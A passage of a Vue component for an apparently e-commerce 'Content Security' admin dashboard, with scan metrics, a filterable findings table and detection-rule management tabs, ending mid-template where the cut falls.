      await fetchRedirectRules();
    } catch (err: any) {
      toastError(err.message || 'Failed to create redirect rule.');
    } finally {
      isSubmittingRedirectRule.value = false;
    }
    return;
  }

  // Non-keyword / non-domain or mock edit behavior
  if (!ruleForm.value.pattern.trim()) {
    toastError('Please enter a valid rule pattern.');
    return;
  }

  if (editingRule.value) {
    editingRule.value.pattern = ruleForm.value.pattern.trim();
    editingRule.value.category = ruleForm.value.category.trim();
    editingRule.value.severity = ruleForm.value.severity;
    editingRule.value.description = ruleForm.value.description.trim();
    editingRule.value.enabled = ruleForm.value.enabled;
    editingRule.value.updatedAt = new Date().toISOString().split('T')[0] || '2026-08-25';
    toastSuccess(`Rule ${editingRule.value.id} updated successfully.`);
  } else {
    const newId = `R-${ruleForm.value.type.substring(0, 2).toUpperCase()}-${Math.floor(10 + Math.random() * 90)}`;
    rules.value.unshift({
      id: newId,
      type: ruleForm.value.type,
      pattern: ruleForm.value.pattern.trim(),
      category: ruleForm.value.category.trim(),
      severity: ruleForm.value.severity,
      description: ruleForm.value.description.trim() || 'Custom administrator detection rule',
      enabled: ruleForm.value.enabled,
      matchCount: 0,
      updatedAt: new Date().toISOString().split('T')[0] || '2026-08-25'
    });
    toastSuccess(`New detection rule ${newId} created successfully.`);
  }

  isRuleModalOpen.value = false;
};

const toggleRuleStatus = (rule: DetectionRule) => {
  rule.enabled = !rule.enabled;
  if (rule.enabled) {
    toastSuccess(`Rule ${rule.id} has been enabled.`);
  } else {
    toastInfo(`Rule ${rule.id} has been disabled.`);
  }
};

const deleteRule = (rule: DetectionRule) => {
  rules.value = rules.value.filter(r => r.id !== rule.id);
  toastSuccess(`Rule ${rule.id} (${rule.pattern}) has been deleted.`);
};

const filteredRules = computed(() => {
  const typeMap: Record<string, DetectionRule['type']> = {
    keywords: 'keyword',
    domains: 'domain',
    html: 'html',
    attributes: 'attribute',
    redirects: 'redirect'
  };
  const targetType = typeMap[rulesSubTab.value];
  return rules.value.filter(r => r.type === targetType);
});

// Table columns for Scan Results
const scanResultColumns: UiTableColumn<SecurityFinding>[] = [
  { key: 'status', label: 'Status', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentType', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'contentName', label: 'Content Entity', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[280px]' },
  { key: 'field', label: 'Field', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'riskScore', label: 'Risk Score', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'findings', label: 'Detected Issue', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 max-w-[320px]' },
  { key: 'scannedAt', label: 'Scanned At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: 'Actions', align: 'right', width: '100px', headerClass: 'px-4 py-3 text-right whitespace-nowrap', cellClass: 'px-4 py-3 text-right whitespace-nowrap' }
];

// Helper styles for badges
const getStatusBadge = (status: SecurityStatus) => {
  switch (status) {
    case 'Critical': return { variant: 'error' as const, label: 'Critical', icon: AlertOctagon };
    case 'High Risk': return { variant: 'error' as const, label: 'High Risk', icon: AlertTriangle };
    case 'Needs Review': return { variant: 'warning' as const, label: 'Needs Review', icon: Info };
    case 'Clean': return { variant: 'success' as const, label: 'Clean', icon: CheckCircle2 };
    case 'Resolved': return { variant: 'info' as const, label: 'Resolved', icon: Check };
    default: return { variant: 'secondary' as const, label: status, icon: Info };
  }
};

const getSeverityBadge = (severity: string) => {
  const val = severity?.toUpperCase();
  switch (val) {
    case 'CRITICAL': return 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30';
    case 'HIGH': return 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30';
    case 'MEDIUM': return 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30';
    case 'LOW': return 'bg-slate-500/10 text-slate-600 dark:text-slate-400 border-slate-500/30';
    case 'INFO': return 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30';
    default: return 'bg-slate-500/10 text-slate-600 border-slate-500/30';
  }
};
</script>

<template>
  <div class="space-y-6 animate-in fade-in duration-500 pb-12">
    <!-- Header Row -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-5">
      <div class="space-y-1">
        <div class="flex items-center gap-2">
          <div class="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center text-primary shadow-xs">
            <Shield class="w-4 h-4" />
          </div>
          <h1 class="text-2xl sm:text-3xl font-display font-extrabold tracking-tight text-foreground">
            Content Security
          </h1>
          <span class="ml-2 px-2.5 py-0.5 rounded-full text-[10px] font-bold uppercase tracking-wider bg-primary/10 text-primary border border-primary/20">
            Active Guard
          </span>
        </div>
        <p class="text-xs sm:text-sm text-muted-foreground">
          Automated threat detection, payload inspection, and content integrity enforcement across products and categories.
        </p>
      </div>

      <!-- Header Actions -->
      <div class="flex items-center gap-3 shrink-0">
        <div class="text-right hidden md:block">
          <p class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Last Scanned</p>
          <p class="text-xs font-semibold text-foreground flex items-center gap-1">
            <Clock class="w-3 h-3 text-muted-foreground" />
            {{ lastScanTimestamp }}
          </p>
        </div>

        <UiButton 
          @click="runFullScan" 
          :disabled="isScanning"
          class="h-10 px-5 gap-2 font-bold text-xs shadow-md shadow-primary/20 whitespace-nowrap"
        >
          <Play v-if="!isScanning" class="w-3.5 h-3.5 fill-current" />
          <RefreshCw v-else class="w-3.5 h-3.5 animate-spin" />
          <span>{{ isScanning ? 'Scanning Catalog...' : 'Run Scan' }}</span>
        </UiButton>
      </div>
    </div>

    <!-- Active Scan Banner (Shows when scan is running) -->
    <div 
      v-if="isScanning" 
      class="bg-card border border-primary/30 rounded-2xl p-4 sm:p-5 shadow-lg relative overflow-hidden animate-in fade-in duration-300"
    >
      <div class="absolute -right-12 -top-12 w-40 h-40 bg-primary/10 rounded-full blur-2xl"></div>
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 relative z-10">
        <div class="flex items-center gap-3">
          <div class="w-9 h-9 rounded-xl bg-primary text-primary-foreground flex items-center justify-center shrink-0 shadow-sm animate-pulse">
            <ShieldCheck class="w-5 h-5" />
          </div>
          <div>
            <h3 class="text-sm font-bold text-foreground">Executing Full Security Inspection</h3>
            <p class="text-xs text-muted-foreground font-mono">{{ scanStepText }}</p>
          </div>
        </div>
        <div class="text-right font-mono font-bold text-sm text-primary shrink-0">
          {{ scanProgress }}%
        </div>
      </div>
      <!-- Progress Bar -->
      <div class="w-full h-2 bg-muted rounded-full overflow-hidden relative z-10">
        <div 
          class="h-full bg-primary transition-all duration-500 rounded-full"
          :style="{ width: `${scanProgress}%` }"
        ></div>
      </div>
    </div>

    <!-- Primary Section Navigation Tabs -->
    <div class="flex items-center gap-2 border-b border-border">
      <button
        @click="mainTab = 'overview'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'overview'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <SlidersHorizontal class="w-4 h-4" />
        <span>Overview</span>
      </button>

      <button
        @click="mainTab = 'results'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'results'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <AlertTriangle class="w-4 h-4" />
        <span>Scan Results</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-rose-500/15 text-rose-600 dark:text-rose-400 border border-rose-500/30 ml-1">
          {{ summaryMetrics.critical + summaryMetrics.high + summaryMetrics.needsReview }}
        </span>
      </button>

      <button
        @click="mainTab = 'rules'"
        :class="cn(
          'flex items-center gap-2 px-4 py-3 text-xs sm:text-sm font-bold border-b-2 transition-all cursor-pointer whitespace-nowrap',
          mainTab === 'rules'
            ? 'border-primary text-primary font-extrabold'
            : 'border-transparent text-muted-foreground hover:text-foreground hover:border-border'
        )"
      >
        <Code2 class="w-4 h-4" />
        <span>Detection Rules</span>
        <span class="px-2 py-0.5 rounded-full text-[10px] font-bold bg-muted text-muted-foreground border border-border ml-1">
          {{ rules.length }}
        </span>
      </button>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 1: OVERVIEW TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'overview'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Summary Metrics Cards -->
      <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3 sm:gap-4">
        <!-- Total Scanned -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-muted-foreground mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest">Total Scanned</span>
            <Layers class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-foreground">
              {{ summaryMetrics.total.toLocaleString() }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              4,120 Products, 186 Categories
            </p>
          </div>
        </div>

        <!-- Clean Rate -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-emerald-600 dark:text-emerald-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Clean</span>
            <CheckCircle2 class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-emerald-600 dark:text-emerald-400">
              {{ summaryMetrics.clean.toLocaleString() }}
            </p>
            <p class="text-[11px] text-emerald-600/90 dark:text-emerald-400/90 mt-1 font-semibold">
              {{ summaryMetrics.cleanPercent }}% Compliant
            </p>
          </div>
        </div>

        <!-- Needs Review -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-amber-600 dark:text-amber-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">Needs Review</span>
            <Info class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-amber-600 dark:text-amber-400">
              {{ summaryMetrics.needsReview }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Pending manual inspection
            </p>
          </div>
        </div>

        <!-- High Risk -->
        <div class="bg-card border border-border rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between">
          <div class="flex items-center justify-between text-orange-600 dark:text-orange-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-muted-foreground">High Risk</span>
            <AlertTriangle class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-orange-600 dark:text-orange-400">
              {{ summaryMetrics.high }}
            </p>
            <p class="text-[11px] text-muted-foreground mt-1 font-medium">
              Dangerous links & attributes
            </p>
          </div>
        </div>

        <!-- Critical -->
        <div class="bg-card border border-rose-500/20 bg-rose-500/5 rounded-2xl p-4 sm:p-5 shadow-xs flex flex-col justify-between col-span-2 sm:col-span-1">
          <div class="flex items-center justify-between text-rose-600 dark:text-rose-400 mb-3">
            <span class="text-[10px] font-bold uppercase tracking-widest text-rose-600 dark:text-rose-400">Critical</span>
            <AlertOctagon class="w-4 h-4" />
          </div>
          <div>
            <p class="text-2xl sm:text-3xl font-display font-extrabold text-rose-600 dark:text-rose-400">
              {{ summaryMetrics.critical }}
            </p>
            <p class="text-[11px] text-rose-600/90 dark:text-rose-400/90 mt-1 font-semibold">
              Immediate action required
            </p>
          </div>
        </div>
      </div>

      <!-- Middle Grid: Detection Breakdown & Scanner Status -->
      <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
        <!-- Detection Method Breakdown -->
        <div class="lg:col-span-4 bg-card border border-border rounded-2xl p-5 shadow-xs flex flex-col justify-between space-y-4">
          <div>
            <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
              <ShieldAlert class="w-4 h-4 text-primary" />
              Threats by Detector Type
            </h3>
            <p class="text-xs text-muted-foreground mt-0.5">Distribution of flagged payloads across rules</p>
          </div>

          <div class="space-y-3">
            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Blacklisted Domains</span>
                <span class="text-muted-foreground">3 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-rose-500 rounded-full" style="width: 40%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Dangerous HTML Tags (script/iframe)</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-orange-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Event Handlers & JS Attributes</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-amber-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>

            <div>
              <div class="flex items-center justify-between text-xs font-semibold mb-1">
                <span class="text-foreground">Spam & Phishing Keywords</span>
                <span class="text-muted-foreground">2 items</span>
              </div>
              <div class="w-full h-1.5 bg-muted rounded-full overflow-hidden">
                <div class="h-full bg-blue-500 rounded-full" style="width: 25%"></div>
              </div>
            </div>
          </div>

          <div class="pt-3 border-t border-border flex items-center justify-between">
            <span class="text-xs text-muted-foreground font-medium">Active Rule Sets</span>
            <button 
              @click="mainTab = 'rules'" 
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              Configure Rules <ArrowRight class="w-3 h-3" />
            </button>
          </div>
        </div>

        <!-- Recent Findings Compact Section -->
        <div class="lg:col-span-8 bg-card border border-border rounded-2xl p-5 shadow-xs space-y-4">
          <div class="flex items-center justify-between">
            <div>
              <h3 class="text-sm font-bold text-foreground flex items-center gap-2">
                <AlertTriangle class="w-4 h-4 text-amber-500" />
                Recent Flagged Findings
              </h3>
              <p class="text-xs text-muted-foreground mt-0.5">Latest high-priority security exceptions</p>
            </div>
            <button 
              @click="mainTab = 'results'"
              class="text-xs font-bold text-primary hover:underline flex items-center gap-1"
            >
              View All ({{ filteredFindings.length }}) <ArrowRight class="w-3 h-3" />
            </button>
          </div>

          <!-- Compact List of Findings -->
          <div class="divide-y divide-border border border-border rounded-xl overflow-hidden">
            <div 
              v-for="item in recentFindings" 
              :key="item.id"
              @click="openFindingDetail(item)"
              class="p-3.5 hover:bg-muted/30 transition-colors flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer group"
            >
              <div class="flex items-start gap-3 min-w-0">
                <div 
                  :class="cn(
                    'w-8 h-8 rounded-lg flex items-center justify-center shrink-0 mt-0.5',
                    item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600' :
                    item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600' :
                    item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600' : 'bg-emerald-500/10 text-emerald-600'
                  )"
                >
                  <component :is="getStatusBadge(item.status).icon" class="w-4 h-4" />
                </div>
                <div class="min-w-0 space-y-0.5">
                  <div class="flex items-center gap-2 flex-wrap">
                    <span class="text-xs font-bold text-foreground group-hover:text-primary transition-colors truncate max-w-[280px] sm:max-w-[340px]">
                      {{ item.contentName }}
                    </span>
                    <span class="text-[10px] font-mono text-muted-foreground bg-muted px-1.5 py-0.5 rounded">
                      {{ item.field }}
                    </span>
                  </div>
                  <p class="text-xs text-muted-foreground line-clamp-1">
                    {{ item.description }}
                  </p>
                </div>
              </div>

              <div class="flex items-center justify-between sm:justify-end gap-3 shrink-0 pt-2 sm:pt-0 border-t sm:border-t-0 border-border/50">
                <div class="text-right">
                  <span 
                    :class="cn(
                      'px-2 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border',
                      item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 border-rose-500/20' :
                      item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 border-orange-500/20' :
                      item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 border-amber-500/20' : 'bg-emerald-500/10 text-emerald-600 border-emerald-500/20'
                    )"
                  >
                    {{ item.status }}
                  </span>
                  <p class="text-[10px] text-muted-foreground mt-0.5">{{ item.scannedAt }}</p>
                </div>
                <button 
                  class="p-1.5 rounded-lg text-muted-foreground group-hover:text-primary hover:bg-muted transition-colors"
                  title="View finding details"
                >
                  <ChevronRight class="w-4 h-4" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 2: SCAN RESULTS TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'results'" class="space-y-4 animate-in fade-in duration-300">
      <!-- Search & Filters Toolbar -->
      <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
          <!-- Search Box -->
          <div class="relative flex-1">
            <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
            <input 
              v-model="searchQuery"
              type="text" 
              placeholder="Search content name, detected token, rule, or issue..." 
              class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
            />
            <button 
              v-if="searchQuery" 
              @click="searchQuery = ''"
              class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
            >
              <X class="w-3.5 h-3.5" />
            </button>
          </div>

          <!-- Filter Dropdowns Row -->
          <div class="flex items-center gap-2 flex-wrap sm:flex-nowrap">
            <!-- Content Type -->
            <select 
              v-model="filterContentType"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Content Types</option>
              <option value="Product">Products</option>
              <option value="Category">Categories</option>
            </select>

            <!-- Status Filter -->
            <select 
              v-model="filterStatus"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Statuses</option>
              <option value="Critical">Critical</option>
              <option value="High Risk">High Risk</option>
              <option value="Needs Review">Needs Review</option>
              <option value="Clean">Clean</option>
              <option value="Resolved">Resolved</option>
            </select>

            <!-- Severity Filter -->
            <select 
              v-model="filterSeverity"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="all">All Severities</option>
              <option value="Critical">Critical</option>
              <option value="High">High</option>
              <option value="Medium">Medium</option>
              <option value="Low">Low</option>
            </select>

            <!-- Detector Filter -->
            <select 
              v-model="filterDetector"
              class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer hidden sm:block"
            >
              <option value="all">All Detectors</option>
              <option value="Keyword">Keyword</option>
              <option value="Domain">Domain</option>
              <option value="HTML">HTML</option>
              <option value="Attribute">Attribute</option>
              <option value="Redirect">Redirect</option>
              <option value="Hidden Content">Hidden Content</option>
              <option value="Obfuscation">Obfuscation</option>
            </select>

            <!-- Page Size Selector -->
            <div class="flex items-center gap-1.5 border-l border-border pl-2 shrink-0">
              <span class="text-[10px] uppercase font-bold tracking-wider text-muted-foreground hidden sm:inline">Show:</span>
              <select 
                v-model="itemsPerPage"
                class="h-9 px-2 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option :value="5">5 / page</option>
                <option :value="10">10 / page</option>
                <option :value="25">25 / page</option>
                <option :value="50">50 / page</option>
              </select>
            </div>

            <!-- Reset Button -->
            <button 
              v-if="searchQuery || filterContentType !== 'all' || filterStatus !== 'all' || filterSeverity !== 'all' || filterDetector !== 'all'"
              @click="resetFilters"
              class="h-9 px-3 text-xs font-bold text-muted-foreground hover:text-foreground hover:bg-muted rounded-lg transition-colors shrink-0"
              title="Reset all filters"
            >
              Reset
            </button>
          </div>
        </div>
      </div>

      <!-- Main Findings Table -->
      <div class="bg-card border border-border rounded-2xl overflow-hidden shadow-xs">
        <UiTable 
          :columns="scanResultColumns" 
          :data="paginatedFindings"
          empty-text="No security findings found"
          empty-description="No items match your active filters or search criteria."
          @row-click="openFindingDetail"
        >
          <!-- Status Cell -->
          <template #cell-status="{ item }">
            <span 
              :class="cn(
                'inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-wider border whitespace-nowrap',
                item.status === 'Critical' ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' :
                item.status === 'High Risk' ? 'bg-orange-500/10 text-orange-600 dark:text-orange-400 border-orange-500/30' :
                item.status === 'Needs Review' ? 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' :
                item.status === 'Resolved' ? 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30' :
                'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30'
              )"
            >
              <component :is="getStatusBadge(item.status).icon" class="w-3 h-3" />
              <span>{{ item.status }}</span>
            </span>
          </template>

          <!-- Type Cell -->
          <template #cell-contentType="{ item }">
            <div class="flex items-center gap-1.5 text-xs font-semibold text-foreground">
              <Package v-if="item.contentType === 'Product'" class="w-3.5 h-3.5 text-primary shrink-0" />
              <Layers v-else class="w-3.5 h-3.5 text-blue-500 shrink-0" />
              <span>{{ item.contentType }}</span>
            </div>
          </template>

          <!-- Content Entity Name Cell -->
          <template #cell-contentName="{ item }">
            <div class="space-y-0.5 min-w-0">
              <p class="text-xs font-bold text-foreground hover:text-primary transition-colors line-clamp-1">
                {{ item.contentName }}
              </p>
              <p class="text-[10px] text-muted-foreground font-mono truncate">
                ID: {{ item.contentId }} · /{{ item.contentSlug }}
              </p>
            </div>
          </template>

          <!-- Field Cell -->
          <template #cell-field="{ item }">
            <span class="px-2 py-0.5 rounded bg-muted text-[11px] font-mono text-muted-foreground border border-border/50">
              {{ item.field }}
            </span>
          </template>

          <!-- Risk Score Cell -->
          <template #cell-riskScore="{ item }">
            <div class="flex items-center gap-2">
              <div class="w-12 h-2 bg-muted rounded-full overflow-hidden">
                <div 
                  :class="cn(
                    'h-full rounded-full',
                    item.riskScore >= 80 ? 'bg-rose-500' :
                    item.riskScore >= 50 ? 'bg-amber-500' : 'bg-emerald-500'
                  )"
                  :style="{ width: `${item.riskScore}%` }"
                ></div>
              </div>
              <span class="text-xs font-mono font-bold text-foreground">
                {{ item.riskScore }}
              </span>
            </div>
          </template>

          <!-- Findings Cell -->
          <template #cell-findings="{ item }">
            <div class="space-y-0.5">
              <p class="text-xs font-medium text-foreground line-clamp-1">
                {{ item.description }}
              </p>
              <div class="flex items-center gap-1 text-[10px] text-muted-foreground font-mono">
                <span class="font-bold text-rose-500 dark:text-rose-400">Match:</span>
                <span class="truncate max-w-[200px] bg-rose-500/10 px-1 rounded text-rose-600 dark:text-rose-400">
                  {{ item.matchedValue }}
                </span>
              </div>
            </div>
          </template>

          <!-- Scanned At Cell -->
          <template #cell-scannedAt="{ item }">
            <span class="text-xs text-muted-foreground font-mono">
              {{ item.scannedAt }}
            </span>
          </template>

          <!-- Actions Cell -->
          <template #cell-actions="{ item }">
            <div class="flex items-center justify-end gap-1.5">
              <button 
                @click.stop="openFindingDetail(item)"
                class="px-2.5 py-1 text-xs font-bold text-primary hover:bg-primary/10 rounded-lg transition-colors"
                title="View detailed finding"
              >
                Inspect
              </button>
            </div>
          </template>
        </UiTable>

        <!-- Pagination Controls -->
        <UiPagination 
          :current-page="currentPage"
          :total-pages="totalPages"
          :total-count="filteredFindings.length"
          :items-per-page="itemsPerPage"
          item-label="findings"
          @update:current-page="currentPage = $event"
        />
      </div>
    </div>

    <!-- ========================================== -->
    <!-- SECTION 3: DETECTION RULES TAB -->
    <!-- ========================================== -->
    <div v-show="mainTab === 'rules'" class="space-y-6 animate-in fade-in duration-300">
      <!-- Sub-Tabs for Detection Rules -->
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-border pb-3">
        <div class="flex items-center gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
          <button 
            v-for="sub in visibleSubTabs"
            :key="sub.id"
            @click="rulesSubTab = sub.id as any"
            :class="cn(
              'px-3.5 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer whitespace-nowrap flex items-center gap-1.5',
              rulesSubTab === sub.id 
                ? 'bg-primary text-primary-foreground shadow-sm' 
                : 'text-muted-foreground hover:text-foreground hover:bg-muted'
            )"
          >
            <span>{{ sub.label }}</span>
            <span 
              :class="cn(
                'px-1.5 py-0.2 rounded-full text-[10px] font-bold',
                rulesSubTab === sub.id ? 'bg-primary-foreground/20 text-primary-foreground' : 'bg-muted text-muted-foreground'
              )"
            >
              {{ sub.count }}
            </span>
          </button>
        </div>

        <UiButton 
          v-if="(rulesSubTab === 'keywords' && canAddKeywordRule) || (rulesSubTab === 'domains' && canAddDomainRule) || (rulesSubTab === 'hidden_content' && canAddHiddenContentRule) || (rulesSubTab === 'obfuscation' && canAddObfuscationRule) || (rulesSubTab === 'redirects' && canAddRedirectRule) || (rulesSubTab === 'html' || rulesSubTab === 'attributes')"
          @click="openAddRuleModal(
            rulesSubTab === 'keywords' ? 'keyword' :
            rulesSubTab === 'domains' ? 'domain' :
            rulesSubTab === 'hidden_content' ? 'hidden_content' :
            rulesSubTab === 'obfuscation' ? 'obfuscation' :
            rulesSubTab === 'html' ? 'html' :
            rulesSubTab === 'attributes' ? 'attribute' : 'redirect'
          )"
          size="sm"
          class="h-9 px-4 gap-1.5 font-bold text-xs shrink-0"
        >
          <Plus class="w-3.5 h-3.5" />
          <span>Add {{ 
            rulesSubTab === 'keywords' ? 'Keyword' :
            rulesSubTab === 'domains' ? 'Domain' :
            rulesSubTab === 'hidden_content' ? 'Hidden Content Rule' :
            rulesSubTab === 'obfuscation' ? 'Obfuscation Rule' :
            rulesSubTab === 'html' ? 'HTML Tag' :
            rulesSubTab === 'attributes' ? 'Attribute' : 'Redirect Rule'
          }}</span>
        </UiButton>
      </div>

      <!-- Keywords Subtab Specific Filters & Table -->
      <div v-if="rulesSubTab === 'keywords'" class="space-y-4">
        <!-- Keyword Rules Filters Toolbar -->
        <div class="bg-card border border-border rounded-2xl p-3.5 shadow-xs space-y-3">
          <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3">
            <!-- Search Box -->
            <div class="relative flex-1">
              <Search class="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input 
                v-model="keywordSearchQuery"
                type="text" 
                placeholder="Search keywords..." 
                class="w-full h-9 pl-9 pr-4 bg-background border border-input rounded-lg text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
              />
              <button 
                v-if="keywordSearchQuery" 
                @click="keywordSearchQuery = ''"
                class="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X class="w-3.5 h-3.5" />
              </button>
            </div>

            <!-- Filters Dropdowns Row -->
            <div class="flex items-center gap-2 flex-wrap lg:flex-nowrap">
              <!-- Category Filter -->
              <select 
                v-model="keywordCategory"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Categories</option>
                <option value="ADULT">Adult</option>
                <option value="DRUG">Drug</option>
                <option value="GAMBLING">Gambling</option>
                <option value="HIDDEN_CONTENT">Hidden Content</option>
                <option value="INJECTION">Injection</option>
                <option value="MALWARE">Malware</option>
                <option value="OBFUSCATION">Obfuscation</option>
                <option value="PHISHING">Phishing</option>
                <option value="REDIRECT">Redirect</option>
                <option value="SCAM">Scam</option>
                <option value="SPAM">Spam</option>
              </select>

              <!-- Severity Filter -->
              <select 
                v-model="keywordSeverity"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Severities</option>
                <option value="CRITICAL">Critical</option>
                <option value="HIGH">High</option>
                <option value="MEDIUM">Medium</option>
                <option value="LOW">Low</option>
                <option value="INFO">Info</option>
              </select>

              <!-- Match Type Filter -->
              <select 
                v-model="keywordMatchType"
                class="h-9 px-2.5 bg-background border border-input rounded-lg text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
              >
                <option value="all">All Match Types</option>
                <option value="SUBSTRING">Substring</option>
                <option value="WORD">Word</option>
              </select>

              <!-- Is Active Filter -->
              <select 
                v-model="keywordIsActive"
